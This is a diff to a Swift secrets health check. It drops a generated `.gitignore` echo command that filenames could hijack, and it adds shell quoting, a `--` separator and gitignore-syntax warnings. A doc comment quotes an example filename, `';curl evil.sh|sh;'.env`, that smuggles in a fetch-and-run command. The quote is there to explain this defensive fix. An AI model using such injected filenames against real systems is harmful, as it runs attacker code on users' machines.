@@ -434,6 +434,33 @@ public struct ProjectHealthCheck: HealthCheck {
     /// `.unknown` and still names the files it found. Guessing is what
     /// produced the false OK; a named file with an honest "could not
     /// determine" is strictly more useful than a confident wrong answer.
+    ///
+    /// **Why the exposed-files branch offers no command.** It used to offer
+    /// `echo '<name>' >> .gitignore`, built by wrapping the filename in a pair
+    /// of single quotes. That was safe only while the candidate list was three
+    /// hardcoded literals; the tree walk above made it "any filename in any
+    /// repository the user cloned", and a file named `';curl evil.sh|sh;'.env`
+    /// turns that string into three commands. `ShellQuoting` fixes the shell
+    /// layer — but a `.gitignore` line needs a *second*, different escaping
+    /// layer on top of it, because gitignore reads `*`, `?`, `[`, `]`, `!`,
+    /// `#` and `\` as syntax, strips trailing spaces, and anchors any pattern
+    /// containing a slash. A generated one-liner correct in both layers at
+    /// once is unreadable, and an unreadable command is an unauditable one —
+    /// which is the whole reason PROPOSAL.md §6 hands the user a string
+    /// instead of running it. Worse, a line that is shell-correct and
+    /// gitignore-wrong *appears* to work while ignoring nothing, which is this
+    /// branch's own failure mode all over again.
+    ///
+    /// So the exposed-files branch names the files and says what to do with
+    /// them, and warns when a name contains gitignore syntax. PROPOSAL.md §6
+    /// already lists "adding a line to `.gitignore`" among the actions inside
+    /// the app's own domain that it may perform directly; when that ships, it
+    /// replaces this explanation with a button, not with a better one-liner.
+    ///
+    /// The `.undetermined` branch keeps its command. `git check-ignore` takes
+    /// a path, not a pattern — there is only the shell layer to get right, and
+    /// `ShellQuoting` plus a `--` separator gets it right for every filename
+    /// that can appear on one line.
     private func gitignoreFinding(for project: InspectedProject, idScope: String, root: URL,
                                   candidates: [URL], gitPath: String?) -> HealthFinding {
         let findingID = "project.\(idScope).gitignore"
@@ -457,12 +484,16 @@ public struct ProjectHealthCheck: HealthCheck {
 
         switch GitIgnoreOracle.classify(candidates: candidates, root: root, gitPath: gitPath) {
         case .undetermined(let reason):
+            // `--` before the paths: a file called `-v.env` is an option to
+            // every CLI ever written, and quoting does not change that.
+            let command = ShellQuoting.singleQuotedList(names).map { "git check-ignore -v -- " + $0 }
+            let explanation = command != nil
+                ? "Check them yourself with the command below, and make sure anything holding a real secret is either ignored or moved into a file this app encrypts."
+                : "Check them yourself with `git check-ignore -v`, and make sure anything holding a real secret is either ignored or moved into a file this app encrypts. \(Self.newlineInNameNote)"
             return HealthFinding(
                 id: findingID, title: title, status: .unknown(reason: reason),
                 detail: "These files under \(project.rootPath) have names that conventionally hold plaintext secrets: \(names.joined(separator: ", ")). Whether they are ignored could not be established, so this app is not telling you either way.",
-                remediation: Remediation(
-                    explanation: "Check them yourself with the command below, and make sure anything holding a real secret is either ignored or moved into a file this app encrypts.",
-                    command: "git check-ignore -v " + names.map { "'\($0)'" }.joined(separator: " ")))
+                remediation: Remediation(explanation: explanation, command: command))
 
         case .answered(let exposed, let tracked):
             guard !exposed.isEmpty else {
@@ -485,14 +516,42 @@ public struct ProjectHealthCheck: HealthCheck {
             let rotationNote = trackedNames.isEmpty
                 ? " If one has already been committed, rotating the values is the only real fix — removing the file from a future commit does not remove it from history."
                 : " For the files already tracked, rotating the values is the only real fix: they are in the history, and neither a .gitignore line nor a future deletion removes them from it. `git rm --cached <file>` stops tracking it going forward."
+
+            var explanation = "Add these to .gitignore, one line per file — \(exposedNames.joined(separator: ", ")) — then move their secrets into a file this app encrypts."
+            if exposedNames.contains(where: Self.nameNeedsGitignoreEscaping) {
+                explanation += " One of those names contains a character .gitignore reads as pattern syntax (*, ?, [, ], !, # or \\), so it has to be escaped with a backslash in the line you add. `git check-ignore -v -- <file>` afterwards tells you whether the line actually took effect."
+            }
+            if exposedNames.contains(where: Self.nameSpansLines) {
+                explanation += " \(Self.newlineInNameNote)"
+            }
+            explanation += rotationNote
+
             return HealthFinding(
                 id: findingID, title: title, status: .problem,
                 detail: detail,
-                remediation: Remediation(
-                    explanation: "Add them to .gitignore, then move their secrets into a file this app encrypts." + rotationNote,
-                    command: exposedNames.map { "echo '\($0)' >> .gitignore" }.joined(separator: "\n")))
+                // No command. See this method's doc comment: a `.gitignore`
+                // line needs pattern escaping as well as shell escaping, and a
+                // string correct in both is one nobody can read before running.
+                remediation: Remediation(explanation: explanation, command: nil))
         }
     }
+
+    /// Characters `.gitignore` reads as syntax rather than as part of a name.
+    /// A line built from such a name without backslash escaping matches
+    /// something other than the file the user was told it covers — and a
+    /// gitignore line that silently ignores nothing is precisely the failure
+    /// this whole finding exists to catch.
+    static func nameNeedsGitignoreEscaping(_ name: String) -> Bool {
+        name.contains(where: { "*?[]!#\\".contains($0) })
+            || name.hasPrefix(" ") || name.hasSuffix(" ")
+    }
+
+    static func nameSpansLines(_ name: String) -> Bool {
+        name.contains(where: { $0 == "\n" || $0 == "\r" })
+    }
+
+    static let newlineInNameNote =
+        "One of these filenames contains a line break, which .gitignore cannot express and no single-line command can name safely, so this app is not offering one — rename the file first."
 
     /// The number of bytes read from the *end* of every candidate file, via
     /// `FileHandle` seek — never more, regardless of the file's total size.
@@ -559,6 +618,21 @@ public struct ProjectHealthCheck: HealthCheck {
     /// is to hide something real. Build and dependency directories
     /// (`node_modules`, `.build`) are *not* on it: a secret can genuinely end
     /// up in one, and being slow is better than being silent.
+    ///
+    /// Known cost, deliberately unpaid here: on a real repository this walk
+    /// visits 272,802 files instead of 13,899 and takes ~170 seconds, because
+    /// `node_modules/.bun` and `.worktrees` are inside it. On *this*
+    /// repository it is 5,347 against 30, since `CLAUDE.md` puts worktrees at
+    /// the repository root. Nothing in M1 exposes that: `HealthReport.standard`
+    /// injects `NoProjects()`, so this walk never runs against a real tree.
+    /// It becomes a multi-minute freeze on first launch the day a project
+    /// picker ships — which is why PROPOSAL.md §6 D now makes solving it a
+    /// precondition of that milestone, with the two acceptable shapes
+    /// (a disclosed dependency-directory exclusion, or a budget that degrades
+    /// the finding to Unknown and names what it did not reach) written down
+    /// there. Do not quietly add an entry to this set instead; the set is the
+    /// list of places the app promises not to look, and every addition owes
+    /// the user a sentence.
     private static let skippedDirectoryNames: Set<String> = [".git", ".hg", ".svn"]
 
     /// Walks the project tree once, classifying every regular file.
